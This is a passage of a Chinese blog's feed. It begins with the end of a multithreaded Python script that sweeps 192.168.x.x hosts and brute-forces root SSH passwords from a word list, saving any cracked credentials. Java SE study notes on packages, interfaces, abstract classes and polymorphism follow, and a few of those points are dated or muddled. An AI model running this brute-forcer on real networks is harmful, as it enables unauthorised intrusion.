class="string">"flag.txt"</span>, <span class="string">"a+"</span>)</span><br><span class="line">file.write(ret)</span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">def getPass(ip, passwd):</span><br><span class="line">p = pexpect.spawn(<span class="string">"ssh root@"</span> + ip, <span class="attribute">timeout</span>=1)</span><br><span class="line">try:</span><br><span class="line">b = p.expect(loginKey)</span><br><span class="line"><span class="keyword">if</span> b == 1:</span><br><span class="line">p.sendline(passwd)</span><br><span class="line">b = p.expect(key)</span><br><span class="line"><span class="keyword">if</span> b &gt; 0:</span><br><span class="line">getFlag(p,<span class="built_in"> ip </span>+ <span class="string">"passwd:"</span> + passwd)</span><br><span class="line">return 1</span><br><span class="line">except:</span><br><span class="line">pass</span><br><span class="line">finally:</span><br><span class="line">p.close()</span><br><span class="line">return 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def scan(ip):</span><br><span class="line">s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">s.settimeout(1)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">s.connect((ip, 22))</span><br><span class="line">b = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> open(<span class="string">"passwd"</span>):</span><br><span class="line">passwd = n.strip();</span><br><span class="line"><span class="keyword">if</span> getPass(ip, passwd) == 1:</span><br><span class="line">b = <span class="literal">False</span></span><br><span class="line">break</span><br><span class="line"><span class="keyword">if</span> b:</span><br><span class="line">file = open(<span class="string">"ip.txt"</span>, <span class="string">"a+"</span>)</span><br><span class="line">file.write(ip + <span class="string">"\n"</span>)</span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">except:</span><br><span class="line">pass</span><br><span class="line">finally:</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(1, 255):</span><br><span class="line"><span class="keyword">for</span> nn <span class="keyword">in</span> range(1, 255):</span><br><span class="line"><span class="built_in">ip </span>= <span class="string">"192.168."</span> + str(n) + <span class="string">"."</span> + str(nn)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">if</span> len(threading.enumerate()) &lt; 255:</span><br><span class="line">break</span><br><span class="line">threading.Thread(<span class="attribute">target</span>=scan, args=(ip,)).start()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;实现步骤&quot;&gt;&lt;a href=&quot;#实现步骤&quot; class=&quot;headerlink&quot; title=&quot;实现步骤&quot;&gt;&lt;/a&gt;实现步骤&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;1、循环遍历出所有网段ip&lt;br&gt;2、利用多线程多并发同时探测22端口&lt;br&gt;3、把探测出来的存活机进行密码爆破&lt;br&gt;4、爆破成功则去拿到主机文件并保存ip、密码等信息&lt;br&gt;5、爆破不成功则记录该ip，进行后续操作。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;代码示例&quot;&gt;&lt;a href=&quot;#代码示例&quot; class=&quot;headerlink&quot; title=&quot;代码示例&quot;&gt;&lt;/a&gt;代码示例&lt;/h1&gt;
    
    </summary>
    
      <category term="网络攻防" scheme="http://liuhaoan.github.io/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="网络攻防" scheme="http://liuhaoan.github.io/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
      <category term="python" scheme="http://liuhaoan.github.io/tags/python/"/>
    
      <category term="ssh" scheme="http://liuhaoan.github.io/tags/ssh/"/>
    
      <category term="爆破" scheme="http://liuhaoan.github.io/tags/%E7%88%86%E7%A0%B4/"/>
    
      <category term="端口扫描" scheme="http://liuhaoan.github.io/tags/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——面向对象_包与权限修饰符</title>
    <link href="http://liuhaoan.github.io/2019/04/07/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E5%8C%85%E4%B8%8E%E6%9D%83%E9%99%90%E4%BF%AE%E9%A5%B0%E7%AC%A6/"/>
    <id>http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-包与权限修饰符/</id>
    <published>2019-04-07T09:55:53.000Z</published>
    <updated>2019-04-08T11:49:47.182Z</updated>
    
    <content type="html"><![CDATA[<h1 id="包的意义"><a href="#包的意义" class="headerlink" title="包的意义"></a>包的意义</h1><blockquote><p>我们以后开发程序都是把源码写在一个个的<code>源文件</code>里面，而不是<code>在一个文件中创建很多的类</code>，包的用处就在这里，说白了包就是为了封装。<br><a id="more"></a></p></blockquote><h1 id="定义包的格式"><a href="#定义包的格式" class="headerlink" title="定义包的格式"></a>定义包的格式</h1><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> <span class="title">包名;</span></span><br><span class="line">多级包用“.”分开</span><br></pre></td></tr></table></figure><ul><li><p>例子：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> <span class="title">java.util.Scanner;</span></span><br></pre></td></tr></table></figure><p>  在这里当然也可以把<code>Scanner</code>用<code>*</code>代替，<code>*</code>就是通配符，表示该目录下的所有包，但是效率没有导入具体的类高，因为<em>需要遍历该包所有类。<br>  ps：在开发中一般都不使用</em>，而是导入<code>具体的类</code>。</p></li></ul><h1 id="定义时的注意事项"><a href="#定义时的注意事项" class="headerlink" title="定义时的注意事项"></a>定义时的注意事项</h1><blockquote><p>1、必须是程序的<code>第一条</code>可执行语句<br>2、<code>package</code>在一个java文件中<code>只能有一个</code><br>3、包名的格式为域名倒写</p><ul><li>例：com.aikan0.add<br>这个add就是这个包的作用。</li></ul></blockquote><h1 id="生成包命令"><a href="#生成包命令" class="headerlink" title="生成包命令"></a>生成包命令</h1><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">javac </span>-d  . 源文件名</span><br></pre></td></tr></table></figure><ul><li>ps：了解一下就好了</li></ul><h1 id="面试题——package、import、class有没有顺序关系？"><a href="#面试题——package、import、class有没有顺序关系？" class="headerlink" title="面试题——package、import、class有没有顺序关系？"></a>面试题——package、import、class有没有顺序关系？</h1><ul><li>解答：<blockquote><p>有，并且<code>package &gt; import &gt; class</code></p></blockquote></li></ul><h1 id="权限修饰符"><a href="#权限修饰符" class="headerlink" title="权限修饰符"></a>权限修饰符</h1><ul><li>四种权限修饰符</li></ul><table><thead><tr><th></th><th>本类</th><th>同一个包下(子类和无关类)</th><th>不同包下(子类)</th><th>不同包下(无关类)</th></tr></thead><tbody><tr><td>private</td><td>Y</td><td></td><td></td><td></td></tr><tr><td>默认</td><td>Y</td><td>Y</td><td></td><td></td></tr><tr><td>protected</td><td>Y</td><td>Y</td><td>Y</td><td></td></tr><tr><td>public</td><td>Y</td><td>Y</td><td>Y</td><td>Y </td></tr></tbody></table><blockquote><p>ps：<code>protected</code>表示受保护的，就是保护权限只给给自己的子类，一般不用在<code>变量</code>，而是用在<code>成员变量</code>或者<code>成员方法</code>。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;包的意义&quot;&gt;&lt;a href=&quot;#包的意义&quot; class=&quot;headerlink&quot; title=&quot;包的意义&quot;&gt;&lt;/a&gt;包的意义&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;我们以后开发程序都是把源码写在一个个的&lt;code&gt;源文件&lt;/code&gt;里面，而不是&lt;code&gt;在一个文件中创建很多的类&lt;/code&gt;，包的用处就在这里，说白了包就是为了封装。&lt;br&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="面向对象" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
      <category term="包" scheme="http://liuhaoan.github.io/tags/%E5%8C%85/"/>
    
      <category term="权限修饰符" scheme="http://liuhaoan.github.io/tags/%E6%9D%83%E9%99%90%E4%BF%AE%E9%A5%B0%E7%AC%A6/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——面向对象_接口</title>
    <link href="http://liuhaoan.github.io/2019/04/07/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E6%8E%A5%E5%8F%A3/"/>
    <id>http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-接口/</id>
    <published>2019-04-07T09:22:46.000Z</published>
    <updated>2019-04-08T11:50:50.335Z</updated>
    
    <content type="html"><![CDATA[<h1 id="接口概述"><a href="#接口概述" class="headerlink" title="接口概述"></a>接口概述</h1><ul><li>从狭义的角度讲就是指java中的<code>interface</code></li><li>从广义的角度讲对<code>外提供规则</code>的都是接口 <a id="more"></a><h1 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h1></li><li>a : 接口用关键字<code>interface</code>表示    </li></ul><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> 接口名 </span>&#123;&#125;</span><br></pre></td></tr></table></figure><ul><li>b : 类实现接口用<code>implements</code>表示</li></ul><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 类名 <span class="keyword">implements</span> 接口名 </span>&#123;&#125;</span><br></pre></td></tr></table></figure><ul><li>c : 接口不能实例化<blockquote><p>那么，接口如何实例化呢?</p><p> 答：按照多态的方式来实例化。</p></blockquote></li></ul><ul><li><p>d : 接口的子类</p><blockquote><p>a : 可以是抽象类。但是意义不大。<br>b : 可以是具体类。要<code>重写接口中的所有抽象方法</code>。(推荐方案)</p></blockquote></li><li><p>注意事项：</p><blockquote><p>1、接口中的<code>成员变量</code>默认都是<code>常量</code>，他会自动加<code>public static final</code>关键字，并且可以互相交换位置，新手平时都手动给出。</p><p>2、接口中没有构造方法</p><p>3、接口是<code>干爹</code>，不是<code>亲爹</code>，子类<code>不能用super</code>访问父类中的内容，子类默认继承object类</p><p>4、接口中不能定义<code>非抽象</code>方法</p><p>5、类与接口是<code>实现</code>关系而非<code>继承</code>关系（干爹）</p><p>6、同一个类可以实现<code>多个</code>接口</p><ul><li>例子：<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Deom</span> <span class="keyword">implements</span> <span class="title">InterA</span>,<span class="title">InterB</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure></li></ul></blockquote><blockquote><p>8、接口不能实现接口（implements），但是却可以继承（extends）</p></blockquote></li></ul><h1 id="类-与-接口的关系"><a href="#类-与-接口的关系" class="headerlink" title="类 与 接口的关系"></a>类 与 接口的关系</h1><ul><li>a : 类与类：<blockquote><p><code>继承关系</code>,只能单继承,可以多层继承。</p></blockquote></li></ul><ul><li>b : 类与接口：<blockquote><p><code>实现关系</code>,可以单实现,也可以多实现。<br>并且还可以在继承一个类的同时实现多个接口。</p></blockquote></li></ul><ul><li>c : 接口与接口：<blockquote><p><code>继承关系</code>,可以单继承,也可以多继承。</p></blockquote></li></ul><h1 id="抽象类-与-接口的区别："><a href="#抽象类-与-接口的区别：" class="headerlink" title="抽象类 与 接口的区别："></a>抽象类 与 接口的区别：</h1><ul><li>抽象类：<blockquote><p>和普通的类差不多，只是可以定义<code>抽象方法</code>而已</p></blockquote></li></ul><ul><li>接口：<blockquote><p>成员变量：只可以<code>常量</code><br>成员方法：只可以<code>抽象</code></p></blockquote></li></ul><h1 id="设计理念区别（重要）："><a href="#设计理念区别（重要）：" class="headerlink" title="设计理念区别（重要）："></a>设计理念区别（重要）：</h1><ul><li>抽象类：<blockquote><p>定义的是该继承体系的<code>共性功能</code></p><ul><li>例：每个学生都需要学习</li></ul></blockquote></li></ul><ul><li><p>接口：    定义的是该继承体系的<code>扩展性功能</code></p><blockquote><ul><li>例：每个学生在学校的学习方式都不一样，这样就需要扩展</li></ul></blockquote></li><li><p>设计理念区别：</p><blockquote><p>接口是<code>对动作的抽象</code>，抽象类是<code>对根源的抽象</code>。</p><p>抽象类表示的是：这个对象<code>是什么</code>。</p><p>接口表示的是：这个对象能<code>做什么</code>。</p><ul><li><p>比如：男人，女人，这两个类，他们的抽象类是人。<br>说明：他们都是人，他们的根源就是<code>人</code></p></li><li><p>又比如：人可以吃东西，狗也可以吃东西，可以把“吃东西”定义成一个接口，然后让这些类去实现它。<br>说明：他们都可以吃东西，他们的根源是<code>不同</code>的，但是做的动作却<code>相同</code>的。</p></li></ul></blockquote></li></ul><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><ul><li>在高级语言上，一个类只能继承一个类（抽象类）(正如人不可能同时是生物和非生物)，但是可以实现多个接口(吃饭接口、走路接口)。</li><li>当关注一个<code>事物的本质</code>的时候，用<code>抽象类</code>；</li><li>当关注一个<code>要做的动作</code>的时候，用<code>接口</code>。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;接口概述&quot;&gt;&lt;a href=&quot;#接口概述&quot; class=&quot;headerlink&quot; title=&quot;接口概述&quot;&gt;&lt;/a&gt;接口概述&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;从狭义的角度讲就是指java中的&lt;code&gt;interface&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;从广义的角度讲对&lt;code&gt;外提供规则&lt;/code&gt;的都是接口
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="面向对象" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
      <category term="接口" scheme="http://liuhaoan.github.io/tags/%E6%8E%A5%E5%8F%A3/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——面向对象_抽象类</title>
    <link href="http://liuhaoan.github.io/2019/04/07/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E6%8A%BD%E8%B1%A1%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-抽象类/</id>
    <published>2019-04-07T09:04:40.000Z</published>
    <updated>2019-04-08T11:50:10.066Z</updated>
    
    <content type="html"><![CDATA[<h1 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h1><ul><li>关键字：<code>abstract</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> 类名 </span>&#123;&#125;<span class="comment">//抽象类</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;<span class="comment">//抽象方法</span></span><br></pre></td></tr></table></figure><ul><li>特点：<blockquote><p>1、抽象类不一定有抽象方法，有抽象方法的类一定是抽象类或者是接口</p><p>2、抽象类不能实例化，但可以通过多态（子类）来说实现实例化</p><p>3、abstract强制子类重写</p><a id="more"></a></blockquote></li><li><p>抽象类的几个问题：</p><blockquote><p>1、为什么不直接定义空方法？</p><p>解答：抽象类可以正确的引导使用者正确使用它们，<code>减少被误用</code></p><p>2、抽象类有什么作用？</p><p>解答：增强程序的<code>扩展性</code>和<code>兼容性</code>，<code>规范编程</code></p></blockquote></li><li><p>抽象类中的面试题：</p><blockquote><p>1、一个抽象类可以没有抽象方法，抽象类的意义是防止别人创建这个类的对象（抽象类不能被实例化）</p><p>2、<code>abstract</code>不能和<code>static</code>共存</p><p>原因：<code>static</code>让这个方法是静态方法，而静态方法可以用<code>类名.方法名</code>调用，而静态方法可以<code>类名.方法名</code>调用的底层原因是这个方法的对象已经在程序运行时就被创建，并且存到静态区域了，但是抽象方法是抽象的，不是具体的，所以它不能被实例化，进而<code>abstract</code>不能和<code>static</code>共存。</p><p>3、<code>abstract</code>不能和<code>final</code>共存</p><p>原因：<code>abstract</code>强制子类重写，而<code>final</code>表示最终的，它不让子类重写，这里形成了冲突。</p><p>4、<code>abstract</code>不能和<code>private</code>共存</p><p>原因：<code>abstract</code>强制子类重写，而<code>private</code>让子类访问不到，所以它们两个修饰符形成了冲突。</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;抽象类&quot;&gt;&lt;a href=&quot;#抽象类&quot; class=&quot;headerlink&quot; title=&quot;抽象类&quot;&gt;&lt;/a&gt;抽象类&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;关键字：&lt;code&gt;abstract&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;abstract&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; 类名 &lt;/span&gt;&amp;#123;&amp;#125;			&lt;span class=&quot;comment&quot;&gt;//抽象类&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;abstract&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;eat&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;;		&lt;span class=&quot;comment&quot;&gt;//抽象方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;特点：&lt;blockquote&gt;
&lt;p&gt;1、抽象类不一定有抽象方法，有抽象方法的类一定是抽象类或者是接口&lt;/p&gt;
&lt;p&gt;2、抽象类不能实例化，但可以通过多态（子类）来说实现实例化&lt;/p&gt;
&lt;p&gt;3、abstract强制子类重写&lt;/p&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="面向对象" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
      <category term="抽象类" scheme="http://liuhaoan.github.io/tags/%E6%8A%BD%E8%B1%A1%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——面向对象_多态</title>
    <link href="http://liuhaoan.github.io/2019/04/07/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E5%A4%9A%E6%80%81/"/>
    <id>http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-多态/</id>
    <published>2019-04-07T07:58:33.000Z</published>
    <updated>2019-04-08T11:50:27.981Z</updated>
    
    <content type="html"><![CDATA[<h1 id="多态前提"><a href="#多态前提" class="headerlink" title="多态前提"></a>多态前提</h1><ul><li>a : 要有继承关系。</li><li>b : 要有方法重写。</li><li>c : 要有父类引用指向子类对象。<blockquote><p>例有一个父类<code>fu</code>和一个子类<code>zi</code>，那么父类引用子类对象为：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fu a</span> = new zi();</span><br></pre></td></tr></table></figure></blockquote></li></ul><a id="more"></a><h1 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h1><ul><li>编译、运行看左边(父类)</li></ul><blockquote><p>也就是创建对象后，<code>子类引用对象就优先调用子类(这样就不是多态了，因为它没有父类引用子类对象)</code>，<code>父类引用对象就优先调用父类（编译运行看左边）</code></p></blockquote><ul><li>解析：创建对象时，首先在堆中创建子类的对象（this），而这个子类的对象中有一个区域指向super，如果引用这个对象的是<code>父类</code>那么这个引用指向<code>super</code>区域，否则指向<code>this</code>区域</li></ul><h1 id="成员方法"><a href="#成员方法" class="headerlink" title="成员方法"></a>成员方法</h1><ul><li>编译看左边(父类)、运行看右边(子类)。<code>动态绑定</code></li></ul><blockquote><p>ps：父类中一定要有和子类一样的方法，父类中的那个方法可以理解为一个跳板跳转到子类中的方法中。</p></blockquote><h1 id="静态成员方法"><a href="#静态成员方法" class="headerlink" title="静态成员方法"></a>静态成员方法</h1><ul><li>与成员变量同理，<code>编译、运行看左边(父类)</code>，所以<code>多态中静态方法不存在重写</code></li></ul><h1 id="多态的弊端"><a href="#多态的弊端" class="headerlink" title="多态的弊端"></a>多态的弊端</h1><ul><li>父类引用不能使用子类<code>特有的属性和行为</code>，但是能通过<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zi b = <span class="comment">(zi)</span>a;    <span class="comment">//强转类型</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="多态的好处"><a href="#多态的好处" class="headerlink" title="多态的好处"></a>多态的好处</h1><blockquote><p>1、提高了代码的<code>维护性</code>(继承保证)</p><p>2、提高了代码的<code>扩展性</code>(由多态保证)</p></blockquote><h1 id="多态的使用"><a href="#多态的使用" class="headerlink" title="多态的使用"></a>多态的使用</h1><blockquote><p>1、开发是很少在创建对象的时候使用多态，而是直接创建<code>子类引用子类对象</code></p><p>2、在需要使用方法使代码简洁时，<code>当做参数</code>使用多态效果最好，因为<code>扩展性强</code></p><p>比如：现有三个类“<code>动物</code>”“<code>狗</code>”“<code>猫</code>”动物是父类，当我们有很多只狗和猫需要跑时，就可以使用<code>方法函数</code>来使代码简洁，在调用这个方法时可以<code>创建好一个 狗 或 猫  的对象然后传给参数</code>，这就需要使用到多态了，<code>如果不使多态</code>那么就需要给狗和猫分别创建一个函数。</p><ul><li><p>不过<code>在方法中使用多态</code>还有一个问题：狗 和 猫 都有各自<code>特有的功能与属性</code>，如果调用猫的功能，但是传入的对象是狗，那么就出错了。</p></li><li><p>解决方法：关键字    instanceof</p></li></ul><p>ps：了解一下，开发中用到的不多，一般都用到<code>方法重写</code></p><ul><li>代码实例：<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对象变量A   <span class="keyword">instanceof</span>   对象变量B</span><br><span class="line"><span class="comment">//如果是相同的类返回true</span></span><br></pre></td></tr></table></figure></li></ul></blockquote><h1 id="多态中的代码分析"><a href="#多态中的代码分析" class="headerlink" title="多态中的代码分析"></a>多态中的代码分析</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">show2();<span class="comment">//这里调用的是子类中的show方法</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">"我"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">"爱"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>.show();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">"你"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2DuoTai</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">A a = <span class="keyword">new</span> B();</span><br><span class="line">a.show();<span class="comment">//返回一个爱</span></span><br><span class="line"></span><br><span class="line">B b = <span class="keyword">new</span> C();</span><br><span class="line">b.show();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>得出结果：<blockquote><p>在多态中，父类中的方法调用另一个方法，且<code>被调用的方法</code>都存在于子类与父类中的情况下，优先调用子类的方法，也就是<code>父类方法</code>成为了一个跳板，跳转到了子类的方法中</p></blockquote></li><li>还是那句话：<blockquote><p>成员<code>方法</code>编译看左边(父类)、运行看右边(子类)</p><p>成员<code>变量</code>编译看左边(父类)、运行看左边(父类)</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;多态前提&quot;&gt;&lt;a href=&quot;#多态前提&quot; class=&quot;headerlink&quot; title=&quot;多态前提&quot;&gt;&lt;/a&gt;多态前提&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;a : 要有继承关系。&lt;/li&gt;
&lt;li&gt;b : 要有方法重写。&lt;/li&gt;
&lt;li&gt;c : 要有父类引用指向子类对象。&lt;blockquote&gt;
&lt;p&gt;例有一个父类&lt;code&gt;fu&lt;/code&gt;和一个子类&lt;code&gt;zi&lt;/code&gt;，那么父类引用子类对象为：&lt;/p&gt;
&lt;figure class=&quot;highlight ebnf&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;fu a&lt;/span&gt; = new zi();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="面向对象" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
      <category term="多态" scheme="http://liuhaoan.github.io/tags/%E5%A4%9A%E6%80%81/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——面向对象_代码块与继承</title>
    <link href="http://liuhaoan.github.io/2019/04/06/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E4%BB%A3%E7%A0%81%E5%9D%97%E4%B8%8E%E7%BB%A7%E6%89%BF/"/>
    <id>http://liuhaoan.github.io/2019/04/06/javaSE复习之——面向对象-代码块与继承/</id>
    <published>2019-04-06T02:08:03.000Z</published>
    <updated>2019-04-08T11:50:22.436Z</updated>
    
